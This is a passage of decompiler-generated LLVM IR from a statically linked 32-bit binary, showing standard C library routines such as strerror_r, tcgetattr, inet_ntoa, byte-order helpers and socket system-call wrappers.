  %v12_804f30d = icmp eq i8 %v3_804f2fe, %v3_804f302
  %v1_804f30f = icmp eq i1 %v12_804f30d, false
  br i1 %v1_804f30f, label %dec_label_pc_804f339, label %dec_label_pc_804f311.preheader

dec_label_pc_804f311.preheader:                   ; preds = %dec_label_pc_804f2f6
  %v1_804f31110 = icmp eq i8 %v3_804f2fe, 0
  br i1 %v1_804f31110, label %dec_label_pc_804f343, label %dec_label_pc_804f315

dec_label_pc_804f315:                             ; preds = %dec_label_pc_804f311.preheader, %dec_label_pc_804f335
  %v0_804f328 = phi i32 [ %v1_804f328, %dec_label_pc_804f335 ], [ %v1_804f302, %dec_label_pc_804f311.preheader ]
  %v0_804f325 = phi i32 [ %v1_804f325, %dec_label_pc_804f335 ], [ %v1_804f2fe, %dec_label_pc_804f311.preheader ]
  %v1_804f315 = add i32 %v0_804f325, 1
  %v2_804f315 = inttoptr i32 %v1_804f315 to i8*
  %v3_804f315 = load i8, i8* %v2_804f315, align 1
  %v1_804f319 = add i32 %v0_804f328, 1
  %v2_804f319 = inttoptr i32 %v1_804f319 to i8*
  %v3_804f319 = load i8, i8* %v2_804f319, align 1
  %v12_804f31d = icmp eq i8 %v3_804f315, %v3_804f319
  %v1_804f31f = icmp eq i1 %v12_804f31d, false
  br i1 %v1_804f31f, label %dec_label_pc_804f339, label %dec_label_pc_804f321

dec_label_pc_804f321:                             ; preds = %dec_label_pc_804f315
  %v1_804f321 = icmp eq i8 %v3_804f319, 0
  br i1 %v1_804f321, label %dec_label_pc_804f343, label %dec_label_pc_804f325

dec_label_pc_804f325:                             ; preds = %dec_label_pc_804f321
  %v1_804f325 = add i32 %v0_804f325, 2
  %v1_804f328 = add i32 %v0_804f328, 2
  %v1_804f32b = inttoptr i32 %v1_804f325 to i8*
  %v2_804f32b = load i8, i8* %v1_804f32b, align 1
  %v1_804f32e = inttoptr i32 %v1_804f328 to i8*
  %v2_804f32e = load i8, i8* %v1_804f32e, align 1
  %v12_804f331 = icmp eq i8 %v2_804f32b, %v2_804f32e
  %v1_804f333 = icmp eq i1 %v12_804f331, false
  br i1 %v1_804f333, label %dec_label_pc_804f339, label %dec_label_pc_804f335

dec_label_pc_804f335:                             ; preds = %dec_label_pc_804f325
  %v1_804f311 = icmp eq i8 %v2_804f32e, 0
  br i1 %v1_804f311, label %dec_label_pc_804f343, label %dec_label_pc_804f315

dec_label_pc_804f339:                             ; preds = %dec_label_pc_804f325, %dec_label_pc_804f315, %dec_label_pc_804f2f6
  %v0_804f339.in = phi i8 [ %v3_804f302, %dec_label_pc_804f2f6 ], [ %v2_804f32e, %dec_label_pc_804f325 ], [ %v3_804f319, %dec_label_pc_804f315 ]
  %v1_804f339 = icmp eq i8 %v0_804f339.in, 0
  %v1_804f33b = icmp eq i1 %v1_804f339, false
  br i1 %v1_804f33b, label %dec_label_pc_804f2cc, label %dec_label_pc_804f343

dec_label_pc_804f341:                             ; preds = %dec_label_pc_804f29f, %dec_label_pc_804f2e1, %dec_label_pc_804f2d5
  br label %dec_label_pc_804f343

dec_label_pc_804f343:                             ; preds = %dec_label_pc_804f311.preheader, %dec_label_pc_804f339, %dec_label_pc_804f321, %dec_label_pc_804f335, %entry, %dec_label_pc_804f2af, %dec_label_pc_804f341
  %storemerge2 = phi i32 [ 0, %dec_label_pc_804f341 ], [ %v1_804f29f, %dec_label_pc_804f2af ], [ %arg1, %entry ], [ %v1_804f30a, %dec_label_pc_804f335 ], [ %v1_804f30a, %dec_label_pc_804f321 ], [ %v1_804f30a, %dec_label_pc_804f339 ], [ %v1_804f30a, %dec_label_pc_804f311.preheader ]
  store i32 %v0_804f287, i32* @ebx, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8 %v2_804f32e, { 0, 2, 1 }
  uselistorder i32 %v1_804f328, { 1, 0 }
  uselistorder i32 %v1_804f325, { 1, 0 }
  uselistorder i8 %v3_804f319, { 0, 2, 1 }
  uselistorder i8 %v3_804f2fe, { 1, 0 }
  uselistorder i32 %v0_804f307, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v1_804f2ed, { 1, 0 }
  uselistorder i8 %v2_804f2e6, { 1, 0 }
  uselistorder i32 %v1_804f2e5, { 0, 2, 1 }
  uselistorder i8 %v2_804f2da, { 1, 0 }
  uselistorder i32 %v0_804f2d956, { 1, 0 }
  uselistorder i32 %v1_804f2c1, { 1, 0 }
  uselistorder i32 %v1_804f29f, { 0, 2, 1 }
  uselistorder i8 %v2_804f293, { 1, 2, 0, 3, 4 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804f343, { 6, 1, 3, 2, 0, 5, 4 }
  uselistorder label %dec_label_pc_804f341, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804f315, { 1, 0 }
  uselistorder label %dec_label_pc_804f2f4, { 1, 0 }
  uselistorder label %dec_label_pc_804f2d5, { 1, 0 }
  uselistorder label %dec_label_pc_804f2e9.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp2, i32* @ebx, align 4
  %v3_804f35d = call i32 @__xpg_strerror_r(i32 %tmp, i32 %tmp2, i32 %tmp1)
  %v0_804f362 = load i32, i32* @ebx, align 4
  ret i32 %v0_804f362
}

define i32 @__xpg_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-108 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  %v6_804f37e = icmp ugt i32 %arg1, 124
  br i1 %v6_804f37e, label %dec_label_pc_804f39b, label %dec_label_pc_804f380

dec_label_pc_804f380:                             ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_8053240.112 to i32), i32* @esi, align 4
  %v1_804f3904 = icmp eq i32 %arg1, 0
  %v1_804f39211 = icmp eq i1 %v1_804f3904, false
  br i1 %v1_804f39211, label %dec_label_pc_804f389, label %dec_label_pc_804f394

dec_label_pc_804f389:                             ; preds = %dec_label_pc_804f380, %dec_label_pc_804f389
  %v0_804f38c = phi i32 [ %v3_804f38c, %dec_label_pc_804f389 ], [ %arg1, %dec_label_pc_804f380 ]
  %v0_804f38f = phi i32 [ %v1_804f38f, %dec_label_pc_804f389 ], [ ptrtoint ([8 x i8]* @global_var_8053240.112 to i32), %dec_label_pc_804f380 ]
  %v1_804f389 = inttoptr i32 %v0_804f38f to i8*
  %v2_804f389 = load i8, i8* %v1_804f389, align 1
  %v7_804f389 = icmp eq i8 %v2_804f389, 0
  %v2_804f38c = zext i1 %v7_804f389 to i32
  %v3_804f38c = add i32 %v2_804f38c, %v0_804f38c
  %v16_804f38c = icmp eq i32 %v3_804f38c, 0
  %v1_804f38f = add i32 %v0_804f38f, 1
  store i32 %v1_804f38f, i32* @esi, align 4
  %v1_804f392 = icmp eq i1 %v16_804f38c, false
  br i1 %v1_804f392, label %dec_label_pc_804f389, label %dec_label_pc_804f394

dec_label_pc_804f394:                             ; preds = %dec_label_pc_804f389, %dec_label_pc_804f380
  %v0_804f396 = phi i32 [ ptrtoint ([8 x i8]* @global_var_8053240.112 to i32), %dec_label_pc_804f380 ], [ %v1_804f38f, %dec_label_pc_804f389 ]
  store i32 0, i32* @ebp, align 4
  %v1_804f396 = inttoptr i32 %v0_804f396 to i8*
  %v2_804f396 = load i8, i8* %v1_804f396, align 1
  %v3_804f396 = icmp eq i8 %v2_804f396, 0
  %v1_804f399 = icmp eq i1 %v3_804f396, false
  br i1 %v1_804f399, label %dec_label_pc_804f394.dec_label_pc_804f3ca_crit_edge, label %dec_label_pc_804f39b

dec_label_pc_804f394.dec_label_pc_804f3ca_crit_edge: ; preds = %dec_label_pc_804f394
  br label %dec_label_pc_804f3ca

dec_label_pc_804f39b:                             ; preds = %dec_label_pc_804f394, %entry
  store i32 22, i32* @ebp, align 4
  %v1_804f3a3 = ashr i32 %arg1, 31
  store i8* null, i8** %stack_var_-108, align 4
  %v6_804f3af = bitcast i32* %stack_var_-17 to i8*
  %v7_804f3af = call i32 @_uintmaxtostr(i8* %v6_804f3af, i32 %arg1, i32 %v1_804f3a3, i32 -10, i32 0)
  %v1_804f3b7 = add i32 %v7_804f3af, -14
  store i32 %v1_804f3b7, i32* @esi, align 4
  %v5_804f3c1 = inttoptr i32 %v1_804f3b7 to i8*
  store i8* %v5_804f3c1, i8** %stack_var_-108, align 4
  %tmp44 = inttoptr i32 %v1_804f3b7 to i16*
  %v6_804f3c2 = call i32 @memcpy(i16* %tmp44, i32 ptrtoint ([15 x i8]* @global_var_8053216.113 to i32), i32 14)
  %v0_804f3d9.pre = load i32, i32* @edi, align 4
  %v0_804f3db.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f3ca

dec_label_pc_804f3ca:                             ; preds = %dec_label_pc_804f394.dec_label_pc_804f3ca_crit_edge, %dec_label_pc_804f39b
  %v0_804f3db = phi i32 [ %v0_804f396, %dec_label_pc_804f394.dec_label_pc_804f3ca_crit_edge ], [ %v0_804f3db.pre, %dec_label_pc_804f39b ]
  %v0_804f3d9 = phi i32 [ %arg3, %dec_label_pc_804f394.dec_label_pc_804f3ca_crit_edge ], [ %v0_804f3d9.pre, %dec_label_pc_804f39b ]
  %v4_804f3cc = icmp eq i32 %arg2, 0
  %v1_804f3d1 = icmp eq i1 %v4_804f3cc, false
  %v2_804f3d9 = select i1 %v1_804f3d1, i32 %v0_804f3d9, i32 0
  store i32 %v2_804f3d9, i32* @edi, align 4
  %v5_804f3db = inttoptr i32 %v0_804f3db to i8*
  store i8* %v5_804f3db, i8** %stack_var_-108, align 4
  %v3_804f3dc = call i32 @strlen(i8* %v5_804f3db)
  %v1_804f3e4 = add i32 %v3_804f3dc, 1
  store i32 %v1_804f3e4, i32* %ebx.global-to-local, align 4
  %v1_804f3e7 = load i32, i32* @edi, align 4
  %tmp46 = icmp ugt i32 %v1_804f3e4, %v1_804f3e7
  br i1 %tmp46, label %dec_label_pc_804f3eb, label %dec_label_pc_804f3f2

dec_label_pc_804f3eb:                             ; preds = %dec_label_pc_804f3ca
  store i32 %v1_804f3e7, i32* %ebx.global-to-local, align 4
  store i32 34, i32* @ebp, align 4
  br label %dec_label_pc_804f3f2

dec_label_pc_804f3f2:                             ; preds = %dec_label_pc_804f3ca, %dec_label_pc_804f3eb
  %v0_804f3f7 = phi i32 [ %v1_804f3e4, %dec_label_pc_804f3ca ], [ %v1_804f3e7, %dec_label_pc_804f3eb ]
  %v1_804f3f2 = icmp eq i32 %v0_804f3f7, 0
  br i1 %v1_804f3f2, label %dec_label_pc_804f40e, label %dec_label_pc_804f3f6

dec_label_pc_804f3f6:                             ; preds = %dec_label_pc_804f3f2
  %v0_804f3f8 = load i32, i32* @esi, align 4
  %v8_804f3f9 = inttoptr i32 %arg2 to i8*
  store i8* %v8_804f3f9, i8** %stack_var_-108, align 4
  %tmp45 = inttoptr i32 %arg2 to i16*
  %v6_804f3fd = call i32 @memcpy(i16* %tmp45, i32 %v0_804f3f8, i32 %v0_804f3f7)
  %v1_804f409 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f409 = add i32 %arg2, -1
  %v3_804f409 = add i32 %v2_804f409, %v1_804f409
  %v4_804f409 = inttoptr i32 %v3_804f409 to i8*
  store i8 0, i8* %v4_804f409, align 1
  br label %dec_label_pc_804f40e

dec_label_pc_804f40e:                             ; preds = %dec_label_pc_804f3f2, %dec_label_pc_804f3f6
  %v0_804f40e = load i32, i32* @ebp, align 4
  %v1_804f40e = icmp eq i32 %v0_804f40e, 0
  br i1 %v1_804f40e, label %dec_label_pc_804f419, label %dec_label_pc_804f412

dec_label_pc_804f412:                             ; preds = %dec_label_pc_804f40e
  %v0_804f412 = load i8*, i8** %stack_var_-108, align 4
  %v1_804f412 = ptrtoint i8* %v0_804f412 to i32
  %v2_804f412 = call i32 @__errno_location(i32 %v1_804f412)
  %v0_804f417 = load i32, i32* @ebp, align 4
  %v2_804f417 = inttoptr i32 %v2_804f412 to i32*
  store i32 %v0_804f417, i32* %v2_804f417, align 4
  %v0_804f41c.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804f419

dec_label_pc_804f419:                             ; preds = %dec_label_pc_804f40e, %dec_label_pc_804f412
  %v0_804f41c = phi i32 [ 0, %dec_label_pc_804f40e ], [ %v0_804f41c.pre, %dec_label_pc_804f412 ]
  ret i32 %v0_804f41c

; uselistorder directives
  uselistorder i32 %v1_804f3e7, { 1, 2, 0 }
  uselistorder i32 %v1_804f3e4, { 1, 0, 2 }
  uselistorder i32 %v1_804f3b7, { 1, 0, 2 }
  uselistorder i32 %v1_804f38f, { 0, 2, 1 }
  uselistorder i32 %v3_804f38c, { 1, 0 }
  uselistorder i8** %stack_var_-108, { 4, 3, 2, 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i8*)* @strlen, { 2, 1, 0, 3 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_8053240.112 to i32), { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_804f419, { 1, 0 }
  uselistorder label %dec_label_pc_804f40e, { 1, 0 }
  uselistorder label %dec_label_pc_804f3f2, { 1, 0 }
  uselistorder label %dec_label_pc_804f3ca, { 1, 0 }
  uselistorder label %dec_label_pc_804f389, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_804f434 = inttoptr i32 %arg1 to i8*
  %v4_804f434 = call i32 @strtok_r(i8* %v3_804f434, i32 %arg2, i32 ptrtoint (i32* @global_var_805b460.114 to i32))
  ret i32 %v4_804f434
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %v3_804f44c = call i32 @__GI_tcgetattr(i32 %arg1, i32* nonnull %stack_var_-60)
  %v1_804f451 = icmp eq i32 %v3_804f44c, 0
  %v1_804f453 = zext i1 %v1_804f451 to i32
  ret i32 %v1_804f453
}

define i32 @__GI_tcgetattr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_2()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = ptrtoint i32* %arg2 to i32
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804f460 = load i32, i32* @esi, align 4
  %v0_804f461 = load i32, i32* @ebx, align 4
  store i32 %v0_804f461, i32* %stack_var_-8, align 4
  %v2_804f465 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_804f465, i32* %eax.global-to-local, align 4
  store i32 %tmp8, i32* @ebx, align 4
  %v3_804f477 = call i32 @ioctl(i32 %arg1, i32 21505, i32 %v2_804f465)
  store i32 %v3_804f477, i32* %eax.global-to-local, align 4
  store i32 %v3_804f477, i32* @esi, align 4
  %v1_804f481 = icmp eq i32 %v3_804f477, 0
  %v1_804f483 = icmp eq i1 %v1_804f481, false
  br i1 %v1_804f483, label %dec_label_pc_804f4c8, label %dec_label_pc_804f485

dec_label_pc_804f485:                             ; preds = %entry
  %v3_804f485 = load i32, i32* %stack_var_-44, align 4
  %v1_804f489 = load i32, i32* @ebx, align 4
  %v2_804f489 = inttoptr i32 %v1_804f489 to i32*
  store i32 %v3_804f485, i32* %v2_804f489, align 4
  %v1_804f48f = load i32, i32* @ebx, align 4
  %v2_804f48f = add i32 %v1_804f48f, 4
  %v3_804f48f = inttoptr i32 %v2_804f48f to i32*
  %v1_804f496 = load i32, i32* @ebx, align 4
  %v2_804f496 = add i32 %v1_804f496, 8
  %v3_804f496 = inttoptr i32 %v2_804f496 to i32*
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v1_804f49d = load i32, i32* @ebx, align 4
  %v2_804f49d = add i32 %v1_804f49d, 12
  %v3_804f49d = inttoptr i32 %v2_804f49d to i32*
  store i32 %tmp3, i32* %v3_804f49d, align 4
  %v4_804f4a0 = zext i8 %tmp to i32
  %v5_804f4a0 = load i32, i32* %eax.global-to-local, align 4
  %v6_804f4a0 = and i32 %v5_804f4a0, -256
  %v7_804f4a0 = or i32 %v6_804f4a0, %v4_804f4a0
  store i32 %v7_804f4a0, i32* %eax.global-to-local, align 4
  %v2_804f4a4 = load i32, i32* @ebx, align 4
  %v3_804f4a4 = add i32 %v2_804f4a4, 16
  %v4_804f4a4 = inttoptr i32 %v3_804f4a4 to i8*
  store i8 %tmp, i8* %v4_804f4a4, align 1
  %v0_804f4a7 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f4aa = ptrtoint i32* %stack_var_-27 to i32
  %v0_804f4af = load i32, i32* @ebx, align 4
  %v1_804f4af = add i32 %v0_804f4af, 17
  store i32 %v1_804f4af, i32* %eax.global-to-local, align 4
  %v4_804f4b3 = call i32 @__GI_mempcpy(i32 %v1_804f4af, i32 %v2_804f4aa, i32 19, i32 %v0_804f4a7)
  store i32 %v4_804f4b3, i32* %eax.global-to-local, align 4
  %v3_804f4c0 = inttoptr i32 %v4_804f4b3 to i8*
  %v4_804f4c0 = call i32 @__GI_memset(i8* %v3_804f4c0, i32 0, i32 13)
  store i32 %v4_804f4c0, i32* %eax.global-to-local, align 4
  %v0_804f4c8.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f4c8

dec_label_pc_804f4c8:                             ; preds = %entry, %dec_label_pc_804f485
  %v0_804f4c8 = phi i32 [ %v3_804f477, %entry ], [ %v0_804f4c8.pre, %dec_label_pc_804f485 ]
  store i32 %v0_804f4c8, i32* %eax.global-to-local, align 4
  %v2_804f4cd = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f4cd, i32* @ebx, align 4
  store i32 %v0_804f460, i32* @esi, align 4
  ret i32 %v0_804f4c8

; uselistorder directives
  uselistorder i32 %v0_804f4c8, { 1, 0 }
  uselistorder i32 %v3_804f477, { 0, 2, 1, 3 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 6, 7, 8, 9, 4, 5 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804f4c8, { 1, 0 }
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804f4d4 = trunc i32 %arg1 to i16
  %v2_804f4d4 = call i16 @llvm.bswap.i16(i16 %v1_804f4d4)
  %v3_804f4d4 = zext i16 %v2_804f4d4 to i32
  ret i32 %v3_804f4d4
}

define i32 @htonl() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v1_804f4e0 = call i32 @llvm.bswap.i32(i32 %tmp)
  ret i32 %v1_804f4e0
}

define i32 @ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804f4e7 = trunc i32 %arg1 to i16
  %v2_804f4e7 = call i16 @llvm.bswap.i16(i16 %v1_804f4e7)
  %v3_804f4e7 = zext i16 %v2_804f4e7 to i32
  ret i32 %v3_804f4e7
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804f4f3 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_804f4f3
}

define i32 @__GI_inet_ntoa_r(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804f4f8 = load i32, i32* @edi, align 4
  %v0_804f4f9 = load i32, i32* @esi, align 4
  %v0_804f4fa = load i32, i32* @ebx, align 4
  store i32 %v0_804f4fa, i32* %stack_var_-12, align 4
  store i32 0, i32* @edi, align 4
  %v1_804f505 = add i32 %arg2, 15
  store i32 %v1_804f505, i32* %ecx.global-to-local, align 4
  store i32 0, i32* @esi, align 4
  %v1_804f50a = call i32 @llvm.bswap.i32(i32 %arg1)
  %sext = mul i32 %v1_804f50a, 16777216
  %v1_804f50c = sdiv i32 %sext, 16777216
  store i32 %v1_804f50c, i32* @ebx, align 4
  br label %dec_label_pc_804f510

dec_label_pc_804f510:                             ; preds = %entry, %dec_label_pc_804f535
  %v0_804f51317 = phi i32 [ %v1_804f50c, %entry ], [ %v2_804f535, %dec_label_pc_804f535 ]
  %v0_804f54016 = phi i32 [ %v1_804f505, %entry ], [ %v0_804f539, %dec_label_pc_804f535 ]
  %v1_804f515 = urem i32 %v0_804f51317, 256
  %v5_804f523 = inttoptr i32 %v0_804f54016 to i8*
  %v6_804f523 = call i32 @_uintmaxtostr(i8* %v5_804f523, i32 %v1_804f515, i32 0, i32 -10, i32 0)
  %v0_804f52b = load i32, i32* @esi, align 4
  %v1_804f52b = icmp eq i32 %v0_804f52b, 0
  %v1_804f52d = add i32 %v6_804f523, -1
  store i32 %v1_804f52d, i32* %ecx.global-to-local, align 4
  br i1 %v1_804f52b, label %dec_label_pc_804f535, label %dec_label_pc_804f532

dec_label_pc_804f532:                             ; preds = %dec_label_pc_804f510
  %v1_804f532 = inttoptr i32 %v0_804f52b to i8*
  store i8 46, i8* %v1_804f532, align 1
  %v0_804f539.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f535

dec_label_pc_804f535:                             ; preds = %dec_label_pc_804f510, %dec_label_pc_804f532
  %v0_804f539 = phi i32 [ %v1_804f52d, %dec_label_pc_804f510 ], [ %v0_804f539.pre, %dec_label_pc_804f532 ]
  %v0_804f535 = load i32, i32* @ebx, align 4
  %v2_804f535 = udiv i32 %v0_804f535, 256
  store i32 %v2_804f535, i32* @ebx, align 4
  %v0_804f538 = load i32, i32* @edi, align 4
  %v1_804f538 = add i32 %v0_804f538, 1
  store i32 %v1_804f538, i32* @edi, align 4
  store i32 %v0_804f539, i32* @esi, align 4
  %v7_804f53e = icmp sgt i32 %v1_804f538, 3
  br i1 %v7_804f53e, label %dec_label_pc_804f540, label %dec_label_pc_804f510

dec_label_pc_804f540:                             ; preds = %dec_label_pc_804f535
  %v1_804f540 = add i32 %v0_804f539, 1
  %v2_804f543 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f543, i32* @ebx, align 4
  store i32 %v0_804f4f9, i32* @esi, align 4
  store i32 %v0_804f4f8, i32* @edi, align 4
  ret i32 %v1_804f540

; uselistorder directives
  uselistorder i32 %v0_804f539, { 0, 2, 1 }
  uselistorder i32 %v1_804f50c, { 1, 0 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 2, 0, 1 }
  uselistorder i32 -10, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804f535, { 1, 0 }
  uselistorder label %dec_label_pc_804f510, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  %v2_804f553 = call i32 @__GI_inet_ntoa_r(i32 %arg1, i32 ptrtoint (i32* @global_var_805b464.115 to i32))
  ret i32 %v2_804f553
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v2_804f55f = ptrtoint i32* %stack_var_-4 to i32
  %v2_804f568 = inttoptr i32 %arg1 to i8*
  %v3_804f568 = call i32 @inet_aton(i8* %v2_804f568, i32 %v2_804f55f)
  %v1_804f573 = icmp eq i32 %v3_804f568, 0
  br i1 %v1_804f573, label %dec_label_pc_804f57b, label %dec_label_pc_804f577

dec_label_pc_804f577:                             ; preds = %entry
  %v3_804f577 = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804f57b

dec_label_pc_804f57b:                             ; preds = %entry, %dec_label_pc_804f577
  %v0_804f57b = phi i32 [ -1, %entry ], [ %v3_804f577, %dec_label_pc_804f577 ]
  ret i32 %v0_804f57b

; uselistorder directives
  uselistorder label %dec_label_pc_804f57b, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804f59f = ptrtoint i32* %stack_var_-12 to i32
  %v2_804f5a6 = call i32 @__socketcall(i32 3, i32 %v2_804f59f)
  ret i32 %v2_804f5a6

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804f5cb = ptrtoint i32* %stack_var_-12 to i32
  %v2_804f5d2 = call i32 @__socketcall(i32 6, i32 %v2_804f5cb)
  ret i32 %v2_804f5d2

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_804f607 = ptrtoint i32* %stack_var_-20 to i32
  %v2_804f60e = call i32 @__socketcall(i32 15, i32 %v2_804f607)
  ret i32 %v2_804f60e

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_804f63b = ptrtoint i32* %stack_var_-16 to i32
  %v2_804f642 = call i32 @__socketcall(i32 10, i32 %v2_804f63b)
  ret i32 %v2_804f642

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_804f66f = ptrtoint i32* %stack_var_-16 to i32
  %v2_804f676 = call i32 @__socketcall(i32 9, i32 %v2_804f66f)
  ret i32 %v2_804f676

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_804f6b3 = ptrtoint i32* %stack_var_-24 to i32
  %v2_804f6ba = call i32 @__socketcall(i32 11, i32 %v2_804f6b3)
  ret i32 %v2_804f6ba

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_804f6ef = ptrtoint i32* %stack_var_-20 to i32
  %v2_804f6f6 = call i32 @__socketcall(i32 14, i32 %v2_804f6ef)
  ret i32 %v2_804f6f6

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804f71b = ptrtoint i32* %stack_var_-12 to i32
  %v2_804f722 = call i32 @__socketcall(i32 1, i32 %v2_804f71b)
  ret i32 %v2_804f722

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 6, 5, 4, 0, 1, 3, 7, 2 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_804f744, label %dec_label_pc_804f737

dec_label_pc_804f737:                             ; preds = %entry
  %v1_804f737 = add i32 %arg1, -64
  %v3_804f737 = sub i32 63, %arg1
  %v4_804f737 = and i32 %v3_804f737, %arg1
  %v5_804f737 = icmp slt i32 %v4_804f737, 0
  %v6_804f737 = icmp eq i32 %v1_804f737, 0
  %v7_804f737 = icmp slt i32 %v1_804f737, 0
  %v3_804f73a = icmp eq i1 %v7_804f737, %v5_804f737
  %v4_804f73a = icmp eq i1 %v6_804f737, false
  %v5_804f73a = and i1 %v4_804f73a, %v3_804f73a
  br i1 %v5_804f73a, label %dec_label_pc_804f744, label %dec_label_pc_804f73c

dec_label_pc_804f73c:                             ; preds = %dec_label_pc_804f737
  %v4_804f73f = call i32 @__sigaddset(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_804f744

dec_label_pc_804f744:                             ; preds = %dec_label_pc_804f737, %entry, %dec_label_pc_804f73c
  %v1_804f744 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_804f749 = inttoptr i32 %v1_804f744 to i32*
  store i32 22, i32* %v1_804f749, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_804f737, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804f744, { 2, 0, 1 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  %v3_804f766 = inttoptr i32 %arg1 to i8*
